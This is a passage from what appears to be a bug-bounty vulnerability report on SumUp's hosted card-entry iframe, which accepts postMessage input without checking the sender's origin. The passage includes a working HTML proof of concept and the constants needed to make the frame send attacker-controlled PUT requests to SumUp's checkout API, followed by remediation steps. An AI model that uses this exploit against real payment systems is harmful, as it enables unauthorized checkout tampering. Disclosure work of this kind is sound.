This is the reason the defect survives review: a developer repairing the broken
outbound `targetOrigin` will find `origin` in scope, already consumed, and
conclude that inbound is handled. Presence of a credential parameter is not
evidence of enforcement.

### 3. The frame-access gate is skipped by a caller-supplied discriminator

```js
let o = {}, d = [];
if ("card" === a.payment_type) {
  if (d = Ce(r.frames), !d.length) return;
  const e = d.filter(e => !e.isValid);
  ...
}
```

The gate that requires cooperating, valid frames is nested under
`payment_type === "card"`. A caller that supplies any other discriminator never
enters the branch, so the frame can be driven with no cooperating frames at all.
A conditional guard skipped by a caller-supplied value is not a guard.

### 4. Remaining barrier: a static UUID shape check

```js
ue = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i
```

This is a public, well-known UUID v1–v5 pattern — attacker-satisfiable, not a
secret and not a permission boundary. (Earlier cycles mis-transcribed this as
`new RegExp(a.pattern)` and as "unrecoverable"; re-reading the served bytes
showed that constructor builds the card-IIN brand table instead.)

### 5. Request headers are guarded — the attacker cannot set them

```js
t && (i.headers["Sumup-Product-Origin"] = t.origin)
i && (n.product_origin = i.origin, n.session_id = i.sessionId)
```

Both the product-origin and session-id headers are added under a truthy guard
that an attacker-origin frame cannot satisfy. So the request that leaves the
frame carries **no** session id and **no** product origin.

## Impact

An attacker page can embed `https://gateway.sumup.com/` framing markup and,
using the PoC constants, dispatch an inbound message that makes the PCI
card-entry frame issue:

```
PUT https://api.sumup.com/v0.2/checkouts/{attacker-chosen-uuid}
```

with an attacker-supplied payment payload (payment_type discriminator chosen to
skip the frame-access gate), subject only to the UUID shape check.

- **Attacker gains:** the ability to originate checkout-write traffic to
  `api.sumup.com` from SumUp's own first-party frame, under an
  attacker-chosen checkout id, with an attacker-chosen body.
- **Bounded by:** the checkout id must exist/resolve server-side for the PUT to
  have an effect; no session id or product origin is attached, so the request
  is not attributed to a merchant widget session.
- **Not claimed:**
  - *response exfiltration* — no capability differential; payloads that come
    back out are fields the sender already chose and reads back.
  - *widget-session replay* — `sessionId` is parsed from
    `checkout.sumup.com/pay/{id}`, a URL-borne resource identifier, not a
    secret; disclosing it crosses no privilege boundary. Downgraded to
    hardening.
  - *broken outbound channel as a control* — the container messenger passes
    `origin: document.referrer` (a full URL) as `targetOrigin`, which throws.
    That is a bug, not a control, and it must be fixed in the same change as
    inbound `event.origin` validation; otherwise the fix inverts the defect.

## Proof of construction (reproducible, no live mutation required)

Serve this from any origin; adjust `variant` / `payment_type` to exercise both
branches:

```html
<iframe id="f" src="https://gateway.sumup.com/"></iframe>
<script>
const f = document.getElementById('f');
f.addEventListener('load', () => f.contentWindow.postMessage({
  type: 'SumUpCard',        // TYPE
  action: 'message',        // ACTION_MESSAGE
  variant: 'hostedfield',   // variant in the served bundle
  message: '<registered-message>',
  value: { /* payment payload */ }
}, '*'));                   // frame never checks this event's origin
</script>
```

Live verification performed in earlier cycles via browser netlog + iframe
console: the frame issued the `PUT /v0.2/checkouts/{uuid}` request. No request
is replayed against live customer data from this repo.

## PoC constants (from served bytes)

| Constant | Value |
|---|---|
| `TYPE` | `SumUpCard` |
| `ACTION_MESSAGE` | `message` |
| `variant` | `hostedfield` |
| inbound filter | `d = e => e.type === o.TYPE` |
| outbound | `t.postMessage(e, n \|\| "*")`, `e.postMessage(t, "*")` |
| UUID gate | `ue = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i` |

## Remediation

1. Compare `event.origin` against an explicit allowlist in the inbound handler
   `p` before dispatch (both bundles, not one call site).
2. Do not repair the outbound `targetOrigin` in isolation — the two land in the
   same diff.
3. Un-skip the frame-access gate: do not let a caller-supplied `payment_type`
   bypass it.
4. Send `X-Frame-Options`/`frame-ancestors` on the frame document as defence in
   depth.

## Scope note

In scope per `scope.yml` (SumUp Group company-owned infrastructure, MISCONFIG
class). The rejected classes in `scope.yml` (clickjacking-without-exploit,
header/banner leak, wildcard-CORS-without-credential-differential) do not
apply: this is a missing origin check on a message channel that reaches a
state-changing API call, with a demonstrated capability differential.

